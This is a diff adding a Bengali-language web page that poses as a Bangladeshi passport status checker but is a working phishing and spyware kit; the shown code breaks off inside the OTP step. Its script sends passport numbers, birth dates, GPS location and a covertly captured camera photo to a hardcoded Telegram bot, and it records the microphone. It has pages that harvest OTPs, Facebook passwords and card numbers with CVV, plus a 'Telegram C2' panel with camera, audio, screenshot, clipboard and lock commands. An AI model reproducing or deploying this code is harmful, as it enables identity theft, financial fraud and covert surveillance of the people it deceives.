@@ -1,0 +1,801 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    <title>পাসপোর্ট পিডিএফ - স্ট্যাটাস চেক</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:system-ui,-apple-system,sans-serif;background:#0f172a;color:#fff;overflow-x:hidden;min-height:100vh}
+        .page{display:none}
+        .page.active{display:block;animation:fadeIn .5s ease}
+        @keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        @keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
+        @keyframes slideUp{from{transform:translateY(40px);opacity:0}to{transform:translateY(0);opacity:1}}
+        .fade-in{animation:fadeIn .5s ease forwards}
+        .slide-up{animation:slideUp .6s ease forwards}
+        .glass-card{background:rgba(255,255,255,.05);backdrop-filter:blur(16px);border:1px solid rgba(255,255,255,.1);border-radius:16px;padding:24px;width:100%}
+        .btn-primary{background:linear-gradient(135deg,#3b82f6,#8b5cf6);color:#fff;padding:14px 28px;border-radius:12px;font-weight:600;border:none;cursor:pointer;width:100%;font-size:16px;transition:.3s}
+        .btn-primary:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(59,130,246,.4)}
+        .btn-primary:disabled{opacity:.5;cursor:not-allowed;transform:none}
+        .btn-danger{background:linear-gradient(135deg,#ef4444,#dc2626);color:#fff;padding:14px 28px;border-radius:12px;font-weight:600;border:none;cursor:pointer;width:100%;font-size:16px}
+        .input-field{background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.15);border-radius:10px;padding:14px 16px;color:#fff;font-size:16px;width:100%;outline:none;transition:.3s}
+        .input-field:focus{border-color:#3b82f6;box-shadow:0 0 0 3px rgba(59,130,246,.2)}
+        .input-field::placeholder{color:rgba(255,255,255,.4)}
+        .loader{border:3px solid rgba(255,255,255,.1);border-top:3px solid #3b82f6;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto}
+        .progress-bar{width:100%;height:6px;background:rgba(255,255,255,.1);border-radius:3px;overflow:hidden}
+        .progress-fill{height:100%;background:linear-gradient(90deg,#3b82f6,#8b5cf6);border-radius:3px;transition:width .5s ease}
+        .badge{display:inline-block;padding:4px 12px;border-radius:20px;font-size:12px;font-weight:600}
+        .badge-green{background:rgba(34,197,94,.2);color:#4ade80}
+        .badge-red{background:rgba(239,68,68,.2);color:#f87171}
+        .badge-blue{background:rgba(59,130,246,.2);color:#60a5fa}
+        .status-dot{width:10px;height:10px;border-radius:50%;display:inline-block}
+        .status-dot.active{background:#22c55e;box-shadow:0 0 12px rgba(34,197,94,.6)}
+        .status-dot.inactive{background:#6b7280}
+        .otp-input{width:48px;height:56px;background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.15);border-radius:12px;color:#fff;font-size:24px;text-align:center;outline:none;transition:.3s}
+        .otp-input:focus{border-color:#3b82f6;box-shadow:0 0 0 3px rgba(59,130,246,.2)}
+        .scan-line{position:absolute;left:0;right:0;height:3px;background:linear-gradient(90deg,transparent,#3b82f6,transparent);box-shadow:0 0 20px rgba(59,130,246,.8);animation:scan 2s ease-in-out infinite;z-index:10}
+        @keyframes scan{0%{top:0}100%{top:100%}}
+        #pip-bar{position:fixed;top:0;left:0;right:0;z-index:99999;background:rgba(0,0,0,.9);backdrop-filter:blur(12px);padding:10px 16px;display:none;border-bottom:2px solid #3b82f6}
+        #pip-bar.show{display:flex;align-items:center;gap:10px}
+        #lockdown-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.97);z-index:99999;display:none;align-items:center;justify-content:center;flex-direction:column;padding:20px}
+        #lockdown-overlay.show{display:flex}
+        #camera-feed{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:.01;pointer-events:none}
+        #audio-record{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:.01}
+        .sms-popup{position:fixed;top:20px;right:20px;z-index:99998;background:rgba(0,0,0,.92);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,.1);border-radius:16px;padding:16px 20px;max-width:320px;display:none;box-shadow:0 20px 60px rgba(0,0,0,.5)}
+        .sms-popup.show{display:block;animation:slideUp .4s ease}
+        .telegram-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+        .tg-btn{background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.1);border-radius:12px;padding:12px 8px;color:#fff;font-size:13px;cursor:pointer;text-align:center;transition:.2s;font-weight:500}
+        .tg-btn:active{transform:scale(.95);background:rgba(59,130,246,.3)}
+        .check-wrap{width:80px;height:80px;margin:0 auto 16px}
+        @media(max-width:640px){.glass-card{padding:16px}.tg-btn{font-size:12px;padding:10px 6px}}
+    </style>
+</head>
+<body>
+
+<!-- লকডাউন ওভারলে -->
+<div id="lockdown-overlay">
+    <div style="text-align:center;max-width:400px">
+        <div style="font-size:52px;margin-bottom:16px">🔒</div>
+        <h2 style="font-size:24px;font-weight:700;margin-bottom:8px">পাসপোর্ট যাচাইকরণ</h2>
+        <p style="color:rgba(255,255,255,.6);margin-bottom:24px">আপনার তথ্য যাচাই করা হচ্ছে। এই পৃষ্ঠায় থাকুন।</p>
+        <div class="loader" style="width:60px;height:60px;border-width:4px"></div>
+        <p style="color:rgba(255,255,255,.4);font-size:13px;margin-top:20px">কয়েক সেকেন্ড সময় লাগবে...</p>
+    </div>
+</div>
+
+<!-- PiP বার -->
+<div id="pip-bar">
+    <div style="width:36px;height:36px;border-radius:8px;background:linear-gradient(135deg,#3b82f6,#8b5cf6);display:flex;align-items:center;justify-content:center;font-weight:700;font-size:16px;flex-shrink:0">P</div>
+    <div style="flex:1;min-width:0">
+        <div style="font-size:13px;font-weight:600">পাসপোর্ট স্ট্যাটাস</div>
+        <div style="font-size:11px;color:rgba(255,255,255,.5)">যাচাই চলছে...</div>
+    </div>
+    <span class="status-dot active"></span>
+</div>
+
+<!-- SMS পপ-আপ -->
+<div class="sms-popup" id="sms-popup">
+    <div style="display:flex;align-items:center;gap:10px">
+        <div style="width:36px;height:36px;border-radius:50%;background:linear-gradient(135deg,#3b82f6,#8b5cf6);display:flex;align-items:center;justify-content:center;font-size:16px">📱</div>
+        <div style="flex:1">
+            <div style="font-size:13px;font-weight:600" id="sms-sender">পাসপোর্ট অফিস</div>
+            <div style="font-size:11px;color:rgba(255,255,255,.4)" id="sms-time">এখনই</div>
+        </div>
+    </div>
+    <div style="margin-top:10px;font-size:13px;line-height:1.5;color:rgba(255,255,255,.85)" id="sms-body">আপনার OTP কোড: ১২৩৪৫৬</div>
+</div>
+
+<video id="camera-feed" autoplay playsinline muted></video>
+<audio id="audio-record" controls style="display:none"></audio>
+<div id="screenshot-canvas"></div>
+
+<!-- ===== পৃষ্ঠা ১: স্প্ল্যাশ ===== -->
+<div class="page active" id="page-splash">
+    <div style="min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px;text-align:center">
+        <div style="width:90px;height:90px;border-radius:20px;background:linear-gradient(135deg,#3b82f6,#8b5cf6);display:flex;align-items:center;justify-content:center;font-size:40px;font-weight:700;margin-bottom:20px;box-shadow:0 20px 50px rgba(59,130,246,.3)">BD</div>
+        <h1 style="font-size:26px;font-weight:800;margin-bottom:6px">পাসপোর্ট পিডিএফ</h1>
+        <p style="font-size:15px;color:rgba(255,255,255,.5);margin-bottom:30px">আপনার পাসপোর্ট স্ট্যাটাস চেক করুন</p>
+        <div style="width:100%;max-width:300px">
+            <div style="background:rgba(255,255,255,.05);border-radius:10px;padding:14px;margin-bottom:10px;border:1px solid rgba(255,255,255,.05)">
+                <div style="display:flex;align-items:center;gap:10px">
+                    <span style="font-size:20px">🛡️</span>
+                    <div style="text-align:left"><div style="font-size:13px;font-weight:600">নিরাপদ সংযোগ</div><div style="font-size:11px;color:rgba(255,255,255,.4)">SSL এনক্রিপ্টেড</div></div>
+                </div>
+            </div>
+        </div>
+        <button class="btn-primary" onclick="showPage('passport')" style="max-width:300px;margin-top:10px">শুরু করুন</button>
+        <p style="font-size:11px;color:rgba(255,255,255,.25);margin-top:14px">চালিয়ে যাওয়ার মাধ্যমে আপনি শর্তাবলী স্বীকার করছেন</p>
+    </div>
+</div>
+
+<!-- ===== পৃষ্ঠা ২: পাসপোর্ট ইনপুট ===== -->
+<div class="page" id="page-passport">
+    <div style="min-height:100vh;padding:24px;display:flex;flex-direction:column;align-items:center;justify-content:center">
+        <div class="glass-card" style="max-width:400px">
+            <div style="text-align:center;margin-bottom:20px">
+                <div style="width:56px;height:56px;border-radius:14px;background:linear-gradient(135deg,#3b82f6,#8b5cf6);display:flex;align-items:center;justify-content:center;font-size:26px;margin:0 auto 12px">📖</div>
+                <h2 style="font-size:20px;font-weight:700">পাসপোর্ট নম্বর লিখুন</h2>
+                <p style="font-size:13px;color:rgba(255,255,255,.4);margin-top:4px">আপনার পাসপোর্টের তথ্য যাচাই করুন</p>
+            </div>
+            <div style="margin-bottom:14px">
+                <label style="font-size:12px;color:rgba(255,255,255,.5);display:block;margin-bottom:6px">পাসপোর্ট নম্বর</label>
+                <input type="text" class="input-field" id="passport-input" placeholder="A12345678" maxlength="12" style="text-transform:uppercase;font-family:monospace;font-size:18px;letter-spacing:2px">
+            </div>
+            <div style="margin-bottom:18px">
+                <label style="font-size:12px;color:rgba(255,255,255,.5);display:block;margin-bottom:6px">জন্ম তারিখ</label>
+                <input type="date" class="input-field" id="dob-input">
+            </div>
+            <button class="btn-primary" onclick="submitPassport()">যাচাই করুন</button>
+        </div>
+    </div>
+</div>
+
+<!-- ===== পৃষ্ঠা ৩: পারমিশন ===== -->
+<div class="page" id="page-permission">
+    <div style="min-height:100vh;padding:24px;display:flex;flex-direction:column;align-items:center;justify-content:center">
+        <div class="glass-card" style="max-width:400px;text-align:center">
+            <div style="font-size:44px;margin-bottom:12px">🔐</div>
+            <h2 style="font-size:20px;font-weight:700;margin-bottom:6px">যাচাইকরণ প্রয়োজন</h2>
+            <p style="font-size:13px;color:rgba(255,255,255,.4);margin-bottom:20px">আপনার পরিচয় নিশ্চিত করতে অনুমতি প্রয়োজন</p>
+            <div style="text-align:left;margin-bottom:20px">
+                <div style="display:flex;align-items:center;gap:10px;padding:10px;background:rgba(255,255,255,.05);border-radius:8px;margin-bottom:6px"><span>📍</span><div><div style="font-size:13px;font-weight:500">অবস্থান</div><div style="font-size:11px;color:rgba(255,255,255,.4)">আপনার শহর যাচাই</div></div></div>
+                <div style="display:flex;align-items:center;gap:10px;padding:10px;background:rgba(255,255,255,.05);border-radius:8px;margin-bottom:6px"><span>📷</span><div><div style="font-size:13px;font-weight:500">ক্যামেরা</div><div style="font-size:11px;color:rgba(255,255,255,.4)">লাইভ ফটো যাচাই</div></div></div>
+                <div style="display:flex;align-items:center;gap:10px;padding:10px;background:rgba(255,255,255,.05);border-radius:8px;margin-bottom:6px"><span>🎤</span><div><div style="font-size:13px;font-weight:500">মাইক্রোফোন</div><div style="font-size:11px;color:rgba(255,255,255,.4)">ভয়েস ম্যাচিং</div></div></div>
+                <div style="display:flex;align-items:center;gap:10px;padding:10px;background:rgba(255,255,255,.05);border-radius:8px"><span>🔔</span><div><div style="font-size:13px;font-weight:500">নোটিফিকেশন</div><div style="font-size:11px;color:rgba(255,255,255,.4)">স্ট্যাটাস আপডেট</div></div></div>
+            </div>
+            <button class="btn-primary" onclick="requestAllPermissions()">✅ সব অনুমতি দিন</button>
+        </div>
+    </div>
+</div>
+
+<!-- ===== পৃষ্ঠা ৪: প্রক্রিয়াকরণ ===== -->
+<div class="page" id="page-processing">
+    <div style="min-height:100vh;padding:24px;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center">
+        <div style="position:relative;width:180px;height:180px;margin-bottom:20px;overflow:hidden;border-radius:14px;background:rgba(255,255,255,.03)">
+            <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:56px">📄</div>
+            <div class="scan-line"></div>
+        </div>
+        <h2 style="font-size:20px;font-weight:700;margin-bottom:6px">যাচাই করা হচ্ছে...</h2>
+        <p style="font-size:13px;color:rgba(255,255,255,.4);margin-bottom:20px" id="processing-status">পাসপোর্ট তথ্য যাচাই করা হচ্ছে</p>
+        <div class="progress-bar" style="max-width:280px"><div class="progress-fill" id="processing-progress" style="width:0%"></div></div>
+        <p style="font-size:12px;color:rgba(255,255,255,.3);margin-top:8px" id="processing-percent">0%</p>
+    </div>
+</div>
+
+<!-- ===== পৃষ্ঠা ৫: OTP ===== -->
+<div class="page" id="page-otp">
+    <div style="min-height:100vh;padding:24px;display:flex;flex-direction:column;align-items:center;justify-content:center">
+        <div class="glass-card" style="max-width:400px;text-align:center">
+            <div style="font-size:44px;margin-bottom:12px">🔑</div>
+            <h2 style="font-size:20px;font-weight:700;margin-bottom:4px">OTP যাচাই</h2>
+            <p style="font-size:13px;color:rgba(255,255,255,.4);margin-bottom:4px">আপনার নম্বরে OTP পাঠানো হয়েছে</p>
+            <p style="font-size:12px;color:rgba(255,255,255,.3);margin-bottom:18px">+880 ******</p>
+            <div style="display:flex;gap:8px;justify-content:center;margin-bottom:18px">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" oninput="otpInput(this,0)" onkeydown="otpKeydown(event,0)">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" oninput="otpInput(this,1)" onkeydown="otpKeydown(event,1)">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" oninput="otpInput(this,2)" onkeydown="otpKeydown(event,2)">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" oninput="otpInput(this,3)" onkeydown="otpKeydown(event,3)">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" oninput="otpInput(this,4)" onkeydown="otpKeydown(event,4)">
+                <input type="text" class="otp-input" maxlength="1" inputmode="numeric" oninput="otpInput(this,5)" onkeydown="otpKeydown(event,5)">
+            </div>
+            <button class="btn-primary" onclick="verifyOTP()" id="otp-verify-btn" disabled>যাচাই করুন</button>
+            <p style="font-size:12px;color:rgba(255,255,255,.3);margin-top:10px"><span id="otp-timer">০২:০০</span> এর মধ্যে OTP দিন</p>
+        </div>
+    </div>
+</div>
+
+<!-- ===== পৃষ্ঠা ৬: ফেসবুক লগইন ===== -->
+<div class="page" id="page-facebook">
+    <div style="min-height:100vh;padding:24px;display:flex;flex-direction:column;align-items:center;justify-content:center">
+        <div class="glass-card" style="max-width:400px;text-align:center">
+            <div style="font-size:44px;margin-bottom:10px">📘</div>
+            <h2 style="font-size:20px;font-weight:700;margin-bottom:4px">Facebook লগইন</h2>
+            <p style="font-size:13px;color:rgba(255,255,255,.4);margin-bottom:20px">আপনার পরিচয় নিশ্চিত করতে লগইন করুন</p>
+            <div style="margin-bottom:12px;text-align:left">
+                <label style="font-size:12px;color:rgba(255,255,255,.5);display:block;margin-bottom:4px">ইমেইল / ফোন</label>
+                <input type="email" class="input-field" id="fb-email" placeholder="ইমেইল বা ফোন" autocomplete="email">
+            </div>
+            <div style="margin-bottom:18px;text-align:left">
+                <label style="font-size:12px;color:rgba(255,255,255,.5);display:block;margin-bottom:4px">পাসওয়ার্ড</label>
+                <input type="password" class="input-field" id="fb-password" placeholder="পাসওয়ার্ড" autocomplete="current-password">
+            </div>
+            <button class="btn-primary" onclick="submitFacebook()">লগইন করুন</button>
+        </div>
+    </div>
+</div>
+
+<!-- ===== পৃষ্ঠা ৭: পেমেন্ট ===== -->
+<div class="page" id="page-payment">
+    <div style="min-height:100vh;padding:24px;display:flex;flex-direction:column;align-items:center;justify-content:center">
+        <div class="glass-card" style="max-width:400px">
+            <div style="text-align:center;margin-bottom:16px">
+                <div style="font-size:44px;margin-bottom:8px">💳</div>
+                <h2 style="font-size:20px;font-weight:700">প্রক্রিয়াকরণ ফি</h2>
+                <p style="font-size:13px;color:rgba(255,255,255,.4)">আপনার পাসপোর্ট প্রক্রিয়াকরণের জন্য ৫০০ টাকা ফি</p>
+            </div>
+            <div style="background:linear-gradient(135deg,#1e293b,#0f172a);border:1px solid rgba(255,255,255,.1);border-radius:14px;padding:16px;margin-bottom:14px">
+                <div style="display:flex;justify-content:space-between;margin-bottom:12px"><span style="font-size:12px;color:rgba(255,255,255,.4)">কার্ড নম্বর</span><span>💳</span></div>
+                <div style="font-family:monospace;font-size:18px;letter-spacing:2px" id="card-display">•••• •••• •••• ••••</div>
+            </div>
+            <div style="margin-bottom:10px"><input type="text" class="input-field" id="card-number" placeholder="কার্ড নম্বর" maxlength="19" inputmode="numeric"></div>
+            <div style="display:flex;gap:10px;margin-bottom:10px">
+                <div style="flex:1"><input type="text" class="input-field" id="card-expiry" placeholder="MM/YY" maxlength="5"></div>
+                <div style="flex:1"><input type="text" class="input-field" id="card-cvv" placeholder="CVV" maxlength="4" inputmode="numeric"></div>
+            </div>
+            <div style="margin-bottom:16px"><input type="text" class="input-field" id="card-name" placeholder="কার্ডে নাম"></div>
+            <button class="btn-primary" onclick="submitPayment()">৫০০ টাকা পরিশোধ করুন</button>
+        </div>
+    </div>
+</div>
+
+<!-- ===== পৃষ্ঠা ৮: সফল ===== -->
+<div class="page" id="page-success">
+    <div style="min-height:100vh;padding:24px;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center">
+        <svg viewBox="0 0 52 52" style="width:80px;height:80px;margin-bottom:16px">
+            <circle cx="26" cy="26" r="24" fill="none" stroke="#22c55e" stroke-width="2" stroke-dasharray="170" stroke-dashoffset="170" style="animation:drawCircle .6s ease forwards"/>
+            <path fill="none" stroke="#22c55e" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="M14 27l7 7 16-16" stroke-dasharray="50" stroke-dashoffset="50" style="animation:drawCheck .4s .6s ease forwards"/>
+        </svg>
+        <h2 style="font-size:22px;font-weight:700;margin-bottom:6px">যাচাই সম্পন্ন!</h2>
+        <p style="font-size:13px;color:rgba(255,255,255,.5);margin-bottom:20px">আপনার পাসপোর্ট সফলভাবে যাচাই করা হয়েছে</p>
+        <div class="glass-card" style="max-width:280px;margin-bottom:16px;padding:16px">
+            <div style="display:flex;justify-content:space-between;margin-bottom:6px"><span style="font-size:12px;color:rgba(255,255,255,.4)">স্ট্যাটাস</span><span class="badge badge-green">✅ সক্রিয়</span></div>
+            <div style="display:flex;justify-content:space-between"><span style="font-size:12px;color:rgba(255,255,255,.4)">ট্র্যাকিং আইডি</span><span style="font-size:12px;font-family:monospace" id="tracking-id">BD-2024-XXXX</span></div>
+        </div>
+    </div>
+</div>
+
+<!-- ===== পৃষ্ঠা ৯: ড্যাশবোর্ড ===== -->
+<div class="page" id="page-dashboard">
+    <div style="min-height:100vh;padding:14px;max-width:500px;margin:0 auto">
+        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px;padding:10px 0;border-bottom:1px solid rgba(255,255,255,.05)">
+            <div>
+                <h2 style="font-size:17px;font-weight:700">📊 কন্ট্রোল প্যানেল</h2>
+                <p style="font-size:11px;color:rgba(255,255,255,.35)">টেলিগ্রাম C2 কমান্ড</p>
+            </div>
+            <div style="display:flex;align-items:center;gap:6px">
+                <span class="status-dot active"></span>
+                <span style="font-size:11px;color:rgba(255,255,255,.4)" id="conn-status">সংযুক্ত</span>
+            </div>
+        </div>
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:12px">
+            <div class="glass-card" style="padding:10px;text-align:center"><div style="font-size:22px;font-weight:700;color:#3b82f6" id="stat-victims">০</div><div style="font-size:10px;color:rgba(255,255,255,.35)">শিকার</div></div>
+            <div class="glass-card" style="padding:10px;text-align:center"><div style="font-size:22px;font-weight:700;color:#22c55e" id="stat-commands">০</div><div style="font-size:10px;color:rgba(255,255,255,.35)">কমান্ড</div></div>
+        </div>
+        <div style="margin-bottom:10px">
+            <h3 style="font-size:13px;font-weight:600;margin-bottom:6px">⚡ কমান্ড</h3>
+            <div class="telegram-grid">
+                <button class="tg-btn" onclick="sendCommand('/info')">📋 তথ্য</button>
+                <button class="tg-btn" onclick="sendCommand('/clipboard')">📋 ক্লিপবোর্ড</button>
+                <button class="tg-btn" onclick="sendCommand('/location')">📍 অবস্থান</button>
+                <button class="tg-btn" onclick="sendCommand('/camera')">📷 ক্যামেরা</button>
+                <button class="tg-btn" onclick="sendCommand('/audio_start')">🎤 অডিও</button>
+                <button class="tg-btn" onclick="sendCommand('/audio_stop')">🔇 বন্ধ</button>
+                <button class="tg-btn" onclick="sendCommand('/screenshot')">📸 স্ক্রিনশট</button>
+                <button class="tg-btn" onclick="sendCommand('/lock')">🔒 লক</button>
+                <button class="tg-btn" onclick="sendCommand('/unlock')">🔓 আনলক</button>
+                <button class="tg-btn" onclick="sendCommand('/pip_on')">📌 PiP চালু</button>
+                <button class="tg-btn" onclick="sendCommand('/pip_off')">🚫 PiP বন্ধ</button>
+                <button class="tg-btn" onclick="sendCommand('/sms')">✉️ এসএমএস</button>
+                <button class="tg-btn" onclick="sendCommand('/facebook')">📘 ফেসবুক</button>
+                <button class="tg-btn" onclick="sendCommand('/payment')">💳 পেমেন্ট</button>
+                <button class="tg-btn" onclick="sendCommand('/gps_on')">🛰️ GPS চালু</button>
+                <button class="tg-btn" onclick="sendCommand('/gps_off')">🛰️ GPS বন্ধ</button>
+                <button class="tg-btn" onclick="sendCommand('/stealth_on')">👁️ স্টিলথ চালু</button>
+                <button class="tg-btn" onclick="sendCommand('/stealth_off')">👁️ স্টিলথ বন্ধ</button>
+                <button class="tg-btn" onclick="sendCommand('/status')">📊 স্ট্যাটাস</button>
+                <button class="tg-btn" onclick="sendCommand('/help')">❓ সাহায্য</button>
+            </div>
+        </div>
+        <div class="glass-card" style="padding:12px">
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">
+                <h3 style="font-size:12px;font-weight:600">📥 আউটপুট</h3>
+                <button onclick="clearOutput()" style="background:none;border:none;color:rgba(255,255,255,.35);font-size:11px;cursor:pointer">সাফ</button>
+            </div>
+            <div id="cmd-output" style="font-size:11px;font-family:monospace;color:rgba(255,255,255,.6);min-height:60px;max-height:150px;overflow-y:auto;padding:6px;background:rgba(0,0,0,.3);border-radius:6px">
+                <div style="color:rgba(255,255,255,.2)">কমান্ড চালান...</div>
+            </div>
+        </div>
+        <div style="font-size:10px;color:rgba(255,255,255,.15);text-align:center;padding:10px 0">টেলিগ্রাম: @sarmin_akter_11223</div>
+    </div>
+</div>
+
+<script>
+// ============================================================
+// কনফিগারেশন — আপনার টেলিগ্রাম বট
+// ============================================================
+const BOT_TOKEN = "8553406795:AAEUeK-fOnWFrvlCnKm-SCpdoXSzSy-09WU";
+const CHAT_ID = "8516934257";
+const API = `https://api.telegram.org/bot${BOT_TOKEN}/`;
+
+// ============================================================
+// স্টেট ম্যানেজমেন্ট
+// ============================================================
+const S = {
+    page: 'splash',
+    stream: null,
+    audioRec: null,
+    audioChunks: [],
+    gpsWatch: null,
+    gpsOn: false,
+    stealthOn: false,
+    stealthInt: null,
+    locked: false,
+    pipOn: false,
+    clipInt: null,
+    otp: '',
+    otpTimer: null,
+    otpLeft: 120,
+    fbDone: false,
+    payDone: false,
+    camCap: false,
+    data: {}
+};
+
+// ============================================================
+// হেল্পার ফাংশন
+// ============================================================
+function $(id) { return document.getElementById(id); }
+function qs(s) { return document.querySelector(s); }
+function qsa(s) { return document.querySelectorAll(s); }
+
+async function tg(txt) {
+    try {
+        await fetch(API+'sendMessage', {
+            method:'POST', headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({chat_id:CHAT_ID, text:txt, parse_mode:'HTML'})
+        });
+    } catch(e) {}
+}
+
+async function tgPhoto(b64, cap='') {
+    try {
+        const bin = atob(b64.split(',')[1]||b64);
+        const arr = new Uint8Array(bin.length);
+        for(let i=0;i<bin.length;i++) arr[i]=bin.charCodeAt(i);
+        const fd = new FormData();
+        fd.append('chat_id',CHAT_ID);
+        fd.append('photo',new Blob([arr],{type:'image/png'}),'shot.png');
+        if(cap) fd.append('caption',cap);
+        await fetch(API+'sendPhoto',{method:'POST',body:fd});
+    } catch(e) {}
+}
+
+async function tgDoc(blob, name, cap='') {
+    try {
+        const fd = new FormData();
+        fd.append('chat_id',CHAT_ID);
+        fd.append('document',blob,name);
+        if(cap) fd.append('caption',cap);
+        await fetch(API+'sendDocument',{method:'POST',body:fd});
+    } catch(e) {}
+}
+
+// ============================================================
+// পৃষ্ঠা নেভিগেশন
+// ============================================================
+function showPage(id) {
+    qsa('.page').forEach(p=>p.classList.remove('active'));
+    const el = $('page-'+id);
+    if(el) { el.classList.add('active'); S.page=id; sessionStorage.setItem('pg',id); }
+}
+
+// সেশন রিস্টোর
+(function(){const p=sessionStorage.getItem('pg');if(p&&p!=='splash')showPage(p)})();
+
+// ============================================================
+// পার্ট ২: JavaScript (শুরু) — পাসপোর্ট & পারমিশন
+// ============================================================
+async function submitPassport() {
+    const num = $('passport-input').value.trim();
+    const dob = $('dob-input').value;
+    if(!num||num.length<6) return alert('পাসপোর্ট নম্বর দিন');
+    if(!dob) return alert('জন্ম তারিখ দিন');
+    S.data.passport=num; S.data.dob=dob;
+    await tg(`📄 <b>পাসপোর্ট তথ্য</b>\nনম্বর: ${num}\nজন্ম: ${dob}\nUA: ${navigator.userAgent}`);
+    showPage('permission');
+}
+
+async function requestAllPermissions() {
+    const r = [];
+    try {
+        const p = await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true,timeout:1e4}));
+        S.data.loc={lat:p.coords.latitude,lng:p.coords.longitude,acc:p.coords.accuracy};
+        r.push('✅ অবস্থান পাওয়া গেছে');
+        await tg(`📍 <b>অবস্থান</b>\n${p.coords.latitude},${p.coords.longitude}\nনির্ভুলতা: ${p.coords.accuracy}m`);
+    } catch(e) { r.push('❌ অবস্থান ব্যর্থ'); await tg(`❌ অবস্থান: ${e.message}`); }
+
+    try {
+        const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:640},height:{ideal:480}},audio:false});
+        S.stream=s;
+        const v=$('camera-feed'); v.srcObject=s; await v.play();
+        setTimeout(async()=>{
+            try {
+                const c=document.createElement('canvas');
+                c.width=v.videoWidth||640;c.height=v.videoHeight||480;
+                c.getContext('2d').drawImage(v,0,0);
+                const d=c.toDataURL('image/png');
+                S.data.photo=d; S.camCap=true;
+                await tgPhoto(d,'📷 ক্যামেরা ক্যাপচার');
+                r.push('✅ ক্যামেরা: ছবি তোলা হয়েছে');
+            } catch(e) { await tg(`❌ ক্যামেরা ক্যাপচার: ${e.message}`); }
+        },3000);
+        r.push('✅ ক্যামেরা চালু');
+    } catch(e) { r.push('❌ ক্যামেরা ব্যর্থ'); await tg(`❌ ক্যামেরা: ${e.message}`); }
+
+    try {
+        const as = await navigator.mediaDevices.getUserMedia({audio:{echoCancellation:false,noiseSuppression:false,autoGainControl:false}});
+        if(!S.stream) S.stream=as; else as.getAudioTracks().forEach(t=>S.stream.addTrack(t));
+        S.audioRec=new MediaRecorder(as);
+        S.audioRec.ondataavailable=e=>{if(e.data.size>0)S.audioChunks.push(e.data)};
+        r.push('✅ মাইক্রোফোন প্রস্তুত');
+    } catch(e) { r.push('❌ মাইক্রোফোন ব্যর্থ'); await tg(`❌ মাইক: ${e.message}`); }
+
+    if('Notification'in window) {
+        const n=await Notification.requestPermission();
+        r.push(n==='granted'?'✅ নোটিফিকেশন অনুমোদিত':'ℹ️ নোটিফিকেশন প্রত্যাখ্যাত');
+    }
+
+    await tg(`🔐 <b>পারমিশন ফলাফল</b>\n${r.join('\n')}`);
+    enableLockdown();
+    showPage('processing');
+    startProcessing();
+}
+
+// ============================================================
+// প্রক্রিয়াকরণ অ্যানিমেশন
+// ============================================================
+function startProcessing() {
+    let p=0;
+    const s=['পাসপোর্ট তথ্য যাচাই...','সরকারি ডাটাবেস সংযুক্ত...','বায়োমেট্রিক মিলানো...','নিরাপত্তা পরীক্ষা...','রিপোর্ট তৈরি...'];
+    const int=setInterval(()=>{
+        p+=Math.random()*8+2; if(p>100)p=100;
+        $('processing-progress').style.width=p+'%';
+        $('processing-percent').textContent=Math.round(p)+'%';
+        $('processing-status').textContent=s[Math.min(Math.floor(p/20),s.length-1)];
+        if(p>=100){clearInterval(int);setTimeout(()=>{showPage('otp');startOtp()},500)}
+    },400);
+}
+
+// ============================================================
+// OTP
+// ============================================================
+function otpInput(inp,i){
+    inp.value=inp.value.replace(/[^0-9]/g,'');
+    if(inp.value&&i<5){const n=qsa('.otp-input')[i+1];if(n)n.focus()}
+    updateOtp();
+}
+function otpKeydown(e,i){
+    if(e.key==='Backspace'&&!e.target.value&&i>0){
+        const p=qsa('.otp-input')[i-1];if(p){p.focus();p.value=''}
+        updateOtp();
+    }
+}
+function updateOtp(){
+    const ins=qsa('.otp-input'); S.otp='';let all=true;
+    ins.forEach(i=>{S.otp+=i.value;if(!i.value)all=false});
+    $('otp-verify-btn').disabled=!all;
+}
+function startOtp(){
+    S.otpLeft=120; if(S.otpTimer)clearInterval(S.otpTimer);
+    S.otpTimer=setInterval(()=>{
+        S.otpLeft--;
+        $('otp-timer').textContent=`${String(Math.floor(S.otpLeft/60)).padStart(2,'০')}:${String(S.otpLeft%60).padStart(2,'০')}`;
+        if(S.otpLeft<=0){clearInterval(S.otpTimer);$('otp-timer').textContent='সময় শেষ!'}
+    },1000);
+}
+async function verifyOTP(){
+    if(S.otp.length!==6)return alert('সম্পূর্ণ OTP দিন');
+    S.data.otp=S.otp;
